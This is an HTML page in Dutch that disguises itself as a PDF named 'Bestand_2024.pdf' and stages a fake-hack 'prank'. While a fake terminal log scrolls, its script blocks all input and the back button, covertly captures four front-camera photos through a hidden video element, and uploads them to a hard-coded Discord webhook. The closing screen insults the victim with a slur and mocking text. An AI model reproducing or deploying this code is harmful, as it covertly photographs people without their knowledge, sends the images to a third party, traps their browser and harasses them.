<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <title>Bestand_2024.pdf</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { min-height: calc(100% + 700px); background: #000; }
    body {
      min-height: calc(100vh + 700px);
      touch-action: none; overscroll-behavior: none;
      background: #000; color: #00ff00;
      font-family: 'Courier New', Courier, monospace;
      user-select: none; -webkit-user-select: none;
      -webkit-touch-callout: none; -webkit-tap-highlight-color: transparent;
    }
    #blocker {
      position: fixed; inset: 0; z-index: 9999;
      background: transparent; pointer-events: auto; touch-action: none;
    }
    .scanlines {
      position: fixed; inset: 0; pointer-events: none; z-index: 100;
      background: repeating-linear-gradient(0deg,
        transparent, transparent 2px,
        rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px);
    }
    #init-screen {
      position: fixed; inset: 0; background: #000;
      display: flex; align-items: center; justify-content: center; z-index: 50;
    }
    #init-screen .dot {
      width: 8px; height: 8px; background: #00ff00; border-radius: 50%;
      margin: 0 5px; animation: dotblink 1.2s infinite; box-shadow: 0 0 6px #00ff00;
    }
    #init-screen .dot:nth-child(2) { animation-delay: 0.2s; }
    #init-screen .dot:nth-child(3) { animation-delay: 0.4s; }
    @keyframes dotblink {
      0%,80%,100% { opacity:.1; transform:scale(.8); }
      40%         { opacity:1;  transform:scale(1.2); }
    }
    #log {
      display: none; position: fixed; top: 50%; left: 50%;
      transform: translate(-50%,-50%);
      font-size: clamp(.72rem,3.2vw,.88rem); color: #00ff00;
      width: 92%; max-width: 480px; height: 75vh;
      overflow: hidden; line-height: 1.9; text-shadow: 0 0 5px #00ff00;
    }
    #log .cursor::after { content:'█'; animation: blink 1s step-end infinite; }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }

    #prank-screen {
      display: none; position: fixed; inset: 0; background: #001200;
      flex-direction: column; align-items: center; justify-content: center;
      text-align: center; padding: 24px 20px; overflow-y: auto;
      animation: zoomIn .6s cubic-bezier(.22,1,.36,1);
    }
    #prank-screen.show { display: flex; }
    @keyframes zoomIn {
      from { transform:scale(.3); opacity:0; }
      to   { transform:scale(1);  opacity:1; }
    }
    #prank-screen .big-emoji { font-size: 80px; }
    #prank-screen h1 {
      font-size: clamp(1.8rem,8vw,2.8rem); color: #ffff00;
      text-shadow: 0 0 16px #ffff00; margin: 12px 0 8px;
    }
    #prank-screen p { font-size: clamp(.95rem,4vw,1.15rem); color: #00ff99; margin: 6px 0; }
    #foto-grid {
      display: none;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin: 14px auto;
      width: 92%;
      max-width: 360px;
    }
    #foto-grid.show { display: grid; }
    #foto-grid img {
      width: 100%; aspect-ratio: 1; object-fit: cover;
      border-radius: 12px; border: 2px solid #ffff00;
      box-shadow: 0 0 14px #ffff0055;
    }
    #foto-grid .foto-num {
      font-size: .65rem; color: #ffff00;
      text-align: center; margin-top: 3px;
    }
    #victim-label { display:none; font-size:.85rem; color:#ffff00; margin-bottom:4px; }
    #prank-screen .credits { font-size:.8rem; color:#555; margin-top:22px; }
  </style>
</head>
<body>

<div id="blocker"></div>
<div class="scanlines"></div>

<div id="init-screen">
  <div class="dot"></div><div class="dot"></div><div class="dot"></div>
</div>

<div id="log"></div>

<video id="cam" autoplay muted playsinline
  style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:-9999px"></video>

<div id="prank-screen">
  <div class="big-emoji">😂💀</div>
  <h1>JE BENT GEPRANKT!</h1>
  <p style="color:#ff4444;font-size:clamp(1rem,5vw,1.3rem);font-weight:bold;margin:8px 0;">
    kanker dikzak 🤣
  </p>
  <p>kijk eens naar dat bodywarmer-dragende mavo kind 💀</p>
  <p>dacht echt dat je gehackt werd hè 😭</p>
  <div id="victim-label">📸 jouw paniekgezicht de afgelopen 30 sec:</div>
  <div id="foto-grid"></div>
  <p style="margin-top:10px;font-size:.9rem;color:#888;">er is natuurlijk niks gehackt joh 😄</p>
  <div class="credits">— gestuurd met veel liefde 💚</div>
</div>

<script>
  var initScreen  = document.getElementById('init-screen');
  var logEl       = document.getElementById('log');
  var prankScreen = document.getElementById('prank-screen');
  var blocker     = document.getElementById('blocker');
  var camEl       = document.getElementById('cam');
  var photoEl     = document.getElementById('victim-photo');
  var labelEl     = document.getElementById('victim-label');

  var capturedPhotos   = [];   // alle gemaakte foto's
  var captureScheduled = false;
  var activeStream     = null;

  /* ---- Safari balk verbergen ---- */
  function hideSafariBars() { window.scrollTo(0, 500); }
  window.addEventListener('load', function() {
    setTimeout(hideSafariBars, 50);
    setTimeout(hideSafariBars, 500);
  });

  /* ---- Terug-knop blokkeren ---- */
  for (var i = 0; i < 50; i++) history.pushState(null, '', location.href);
  function trapBack() {
    for (var j = 0; j < 10; j++) history.pushState(null, '', location.href);
    setTimeout(hideSafariBars, 50);
  }
  window.addEventListener('popstate', trapBack);
  window.addEventListener('beforeunload', function(e) {
    e.preventDefault(); e.returnValue = ''; return '';
  });

  /* ---- Alle events blokkeren ---- */
  var blocked = true;
  function blockEvt(e) {
    if (!blocked) return;
    e.preventDefault(); e.stopPropagation();
    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
  }
  var BLOCK_EVENTS = [
    'click','dblclick','auxclick','mousedown','mouseup','mousemove',
    'pointerdown','pointerup','pointermove','pointercancel',
    'touchstart','touchmove','touchend','touchcancel',
    'gesturestart','gesturechange','gestureend',
    'contextmenu','keydown','keyup','keypress',
    'wheel','dragstart','selectstart','focusin'
  ];
  BLOCK_EVENTS.forEach(function(n) {
    window.addEventListener(n, blockEvt, { capture:true, passive:false });
  });
  if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(function(){});

  /* ---- Foto opslaan in localStorage ---- */
  function savePhoto(dataUrl) {
    try {
      var list = JSON.parse(localStorage.getItem('prank_fotos') || '[]');
      list.push({ tijd: new Date().toLocaleString('nl-NL'), foto: dataUrl });
      if (list.length > 20) list = list.slice(list.length - 20);
      localStorage.setItem('prank_fotos', JSON.stringify(list));
    } catch(e) {}
  }

  /* ---- Foto sturen naar Discord (via Blob — betrouwbaarder op iOS) ---- */
  var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504871414203945021/EP6lLwMehByFAAzVbNHcR2ZLe05l8fyhwK5c6V7b57vhRUkhT59GoPVBnb1vlQV8m6zd';
  var discordBlob = null;

  function stuurNaarDiscord(blob, nummer, poging) {
    if (!DISCORD_WEBHOOK || !blob) return;
    poging = poging || 1;
    if (poging > 4) return;
    var fd = new FormData();
    fd.append('file', blob, 'prank_foto_' + nummer + '.jpg');
    fd.append('content', 'Foto ' + nummer + '/4 — ' + new Date().toLocaleString('nl-NL'));
    fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd })
      .then(function(r) {
        if (!r.ok) setTimeout(function(){ stuurNaarDiscord(blob, nummer, poging+1); }, 3000);
      })
      .catch(function() {
        setTimeout(function(){ stuurNaarDiscord(blob, nummer, poging+1); }, 3000);
      });
  }

  /* ---- Foto maken — nummer = 1,2,3,4 ---- */
  function doCapture(nummer) {
    if (!activeStream) return;
    var w = camEl.videoWidth;
    var h = camEl.videoHeight;
    if (!w || w === 0) {
      setTimeout(function(){ doCapture(nummer); }, 400);
      return;
    }
    try {
      var canvas = document.createElement('canvas');
      var scale  = Math.min(1, 640 / w);
      canvas.width  = Math.round(w * scale);
      canvas.height = Math.round(h * scale);
      canvas.getContext('2d').drawImage(camEl, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(function(blob) {
        if (!blob) return;
        // Lokaal bewaren als dataURL
        var reader = new FileReader();
        reader.onload = function(e) {
          var dataUrl = e.target.result;
          capturedPhotos[nummer - 1] = dataUrl;
          savePhoto(dataUrl);
        };
        reader.readAsDataURL(blob);
        // Naar Discord met fotonummer
        stuurNaarDiscord(blob, nummer);
      }, 'image/jpeg', 0.75);
    } catch(e) {}
  }

  function scheduleCapture() {
    if (captureScheduled) return;
    captureScheduled = true;
    // 4 foto's: op 5, 12, 20 en 27 seconden
    setTimeout(function(){ doCapture(1); }, 5000);
    setTimeout(function(){ doCapture(2); }, 12000);
    setTimeout(function(){ doCapture(3); }, 20000);
    setTimeout(function(){ doCapture(4); }, 27000);
  }

  /* ---- Nep hack-terminal ---- */
  var ip = '192.168.' + (Math.floor(Math.random()*254)+1) + '.' + (Math.floor(Math.random()*254)+1);
  var contacts = Math.floor(Math.random()*300)+50;
  var logLines = [
    '> init secure_shell...',
    '> doelwit gevonden',
    '> ip-adres: ' + ip,
    '> verbinding tot stand gebracht',
    '> firewall omzeild',
    '> root-toegang verkregen',
    '> bestandssysteem koppelen...',
    '> contacten kopiëren... (' + contacts + ')',
    '> sms-berichten uitlezen...',
    '> e-mails doorzoeken...',
    '> media-bibliotheek downloaden...',
    '> locatiegeschiedenis ophalen',
    '> [####----------] 28%',
    '> opgeslagen wachtwoorden ontcijferen...',
    '> bank-app gevonden 💳',
    '> sessietokens onderscheppen',
    '> [########------] 55%',
    '> gegevens uploaden naar server',
    '> camera-stream koppelen...',
    '> microfoon activeren...',
    '> [############--] 83%',
    '> cloudopslag koppelen...',
    '> back-up versleutelen...',
    '> sporen wissen...',
    '> [##############] 100%',
    '> proces voltooid.',
  ];
  var TOTAL = 30000;
  var idx = 0;
  function nextLine() {
    if (idx < logLines.length) {
      var old = logEl.querySelector('.cursor');
      if (old) old.classList.remove('cursor');
      var d = document.createElement('div');
      d.textContent = logLines[idx++];
      d.classList.add('cursor');
      logEl.appendChild(d);
    }
  }

  /* ---- Start hack ---- */
  function startHack() {
    initScreen.style.display = 'none';
    logEl.style.display = 'block';
    hideSafariBars();

    scheduleCapture();

    logLines.forEach(function(_, i) {
      setTimeout(nextLine, i * (TOTAL - 2500) / logLines.length);
    });

    setTimeout(function() {
      blocked = false;
      window.removeEventListener('popstate', trapBack);
      BLOCK_EVENTS.forEach(function(n) {
        window.removeEventListener(n, blockEvt, { capture:true });
      });
      blocker.remove();
      if (activeStream) {
        activeStream.getTracks().forEach(function(t) { t.stop(); });
      }
      var fotoGrid = document.getElementById('foto-grid');
      var labelEl2 = document.getElementById('victim-label');
      if (capturedPhotos.length > 0) {
        capturedPhotos.forEach(function(dataUrl, i) {
          if (!dataUrl) return;
          var wrap = document.createElement('div');
          var img  = document.createElement('img');
          img.src  = dataUrl;
          var num  = document.createElement('div');
          num.className   = 'foto-num';
          num.textContent = (i === 0 ? '5s' : i === 1 ? '12s' : i === 2 ? '20s' : '27s');
          wrap.appendChild(img);
          wrap.appendChild(num);
          fotoGrid.appendChild(wrap);
        });
        fotoGrid.classList.add('show');
        labelEl2.style.display = 'block';
      }
      logEl.style.display = 'none';
      prankScreen.classList.add('show');
    }, TOTAL);
  }

  /* ---- Camera permissie vragen ---- */
  window.addEventListener('load', function() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio: false })
        .then(function(stream) {
          activeStream = stream;
          camEl.srcObject = stream;
          // canplay = video is echt klaar op iOS
          camEl.addEventListener('canplay', scheduleCapture);
          camEl.play().catch(function(){});
          startHack();
        })
        .catch(function() { startHack(); });
    } else {
      startHack();
    }
  });
</script>
</body>
</html>
